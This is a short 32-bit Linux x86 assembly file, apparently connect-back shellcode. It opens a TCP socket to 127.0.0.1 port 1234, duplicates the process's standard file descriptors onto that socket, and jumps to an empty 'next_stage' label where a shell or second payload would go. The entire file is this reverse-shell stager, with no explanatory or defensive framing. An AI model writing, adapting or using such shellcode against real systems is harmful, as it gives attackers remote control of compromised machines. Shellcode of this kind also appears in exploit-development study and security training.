.section .text
.global _start


_start:
  push $0x0100007f
  push $0xd2040002
  mov %esp, %esi

socket:
  xor %eax, %eax
  push %eax # int protocol = 0
  mov $0x66, %al #sys_socketcall(int call, void *args)
  xor %ebx, %ebx
  inc %ebx #socket(int domain, int type, int protocol)
  pushl $0x1 # int type = SOCK_STREAM (0x1) 
  pushl $0x2 # int domain = AF_INET (0x2)
  mov %esp, %ecx
  int $0x80
  mov %eax, %edi

connect:
  xor %eax, %eax
  mov $0x66, %al # sys_socketcall(int call, void *args)
  xor %ebx, %ebx
  mov $0x03, %bl # connect(int sockfd, const struct sockaddr *addr, socklen_t 
  pushl $0x10 #socklen_t addrlen
  pushl %esi # sockaddr *addr
  pushl %edi #int sockfd
  mov %esp, %ecx
  int $0x80
connect_test:
  xor %ecx, %ecx #int newfd
  cmp %ecx, %eax
  jnz exit
  
dup2:
  xor %eax, %eax
  movb $0x3f, %al # sys_dup2(int oldfd, int newfd)
  mov %edi, %ebx #int olddf
  int $0x80
  inc %ecx
  cmp $0x04, %ecx
  jnz dup2
  jmp next_stage
exit:
  xor %ebx, %ebx
  xor %eax, %eax
  inc %eax
  int $0x80 #sys_exit(0)
next_stage:

